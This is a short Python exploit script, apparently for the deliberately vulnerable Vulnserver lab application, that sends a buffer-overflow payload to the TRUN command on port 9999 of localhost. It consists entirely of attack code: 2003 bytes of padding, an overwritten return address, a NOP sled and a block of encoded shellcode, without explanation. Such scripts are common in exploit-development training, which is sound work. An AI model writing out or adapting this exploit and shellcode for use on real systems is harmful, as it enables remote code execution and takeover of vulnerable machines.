#!/bin/python3

from time import sleep
import sys, socket

overflow = (
b"\xdb\xcf\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\xbb\x84\x9d"
b"\xc7\x1e\x31\x58\x17\x03\x58\x17\x83\x6c\x61\x25\xeb\x90"
b"\x72\x28\x14\x68\x83\x4d\x9c\x8d\xb2\x4d\xfa\xc6\xe5\x7d"
b"\x88\x8a\x09\xf5\xdc\x3e\x99\x7b\xc9\x31\x2a\x31\x2f\x7c"
b"\xab\x6a\x13\x1f\x2f\x71\x40\xff\x0e\xba\x95\xfe\x57\xa7"
b"\x54\x52\x0f\xa3\xcb\x42\x24\xf9\xd7\xe9\x76\xef\x5f\x0e"
b"\xce\x0e\x71\x81\x44\x49\x51\x20\x88\xe1\xd8\x3a\xcd\xcc"
b"\x93\xb1\x25\xba\x25\x13\x74\x43\x89\x5a\xb8\xb6\xd3\x9b"
b"\x7f\x29\xa6\xd5\x83\xd4\xb1\x22\xf9\x02\x37\xb0\x59\xc0"
b"\xef\x1c\x5b\x05\x69\xd7\x57\xe2\xfd\xbf\x7b\xf5\xd2\xb4"
b"\x80\x7e\xd5\x1a\x01\xc4\xf2\xbe\x49\x9e\x9b\xe7\x37\x71"
b"\xa3\xf7\x97\x2e\x01\x7c\x35\x3a\x38\xdf\x52\x8f\x71\xdf"
b"\xa2\x87\x02\xac\x90\x08\xb9\x3a\x99\xc1\x67\xbd\xde\xfb"
b"\xd0\x51\x21\x04\x21\x78\xe6\x50\x71\x12\xcf\xd8\x1a\xe2"
b"\xf0\x0c\x8c\xb2\x5e\xff\x6d\x62\x1f\xaf\x05\x68\x90\x90"
b"\x36\x93\x7a\xb9\xdd\x6e\xed\xb9\x21\x70\xec\x2d\x20\x70"
b"\xff\xf1\xad\x96\x95\x19\xf8\x01\x02\x83\xa1\xd9\xb3\x4c"
b"\x7c\xa4\xf4\xc7\x73\x59\xba\x2f\xf9\x49\x2b\xc0\xb4\x33"
b"\xfa\xdf\x62\x5b\x60\x4d\xe9\x9b\xef\x6e\xa6\xcc\xb8\x41"
b"\xbf\x98\x54\xfb\x69\xbe\xa4\x9d\x52\x7a\x73\x5e\x5c\x83"
b"\xf6\xda\x7a\x93\xce\xe3\xc6\xc7\x9e\xb5\x90\xb1\x58\x6c"
b"\x53\x6b\x33\xc3\x3d\xfb\xc2\x2f\xfe\x7d\xcb\x65\x88\x61"
b"\x7a\xd0\xcd\x9e\xb3\xb4\xd9\xe7\xa9\x24\x25\x32\x6a\x44"
b"\xc4\x96\x87\xed\x51\x73\x2a\x70\x62\xae\x69\x8d\xe1\x5a"
b"\x12\x6a\xf9\x2f\x17\x36\xbd\xdc\x65\x27\x28\xe2\xda\x48"
b"\x79")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow 

try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(('127.0.0.1', 9999)) 
     payload = b"TRUN /.:/" + shellcode
     s.send((payload))
     s.close()
except:
    print("Crashed")
    sys.exit()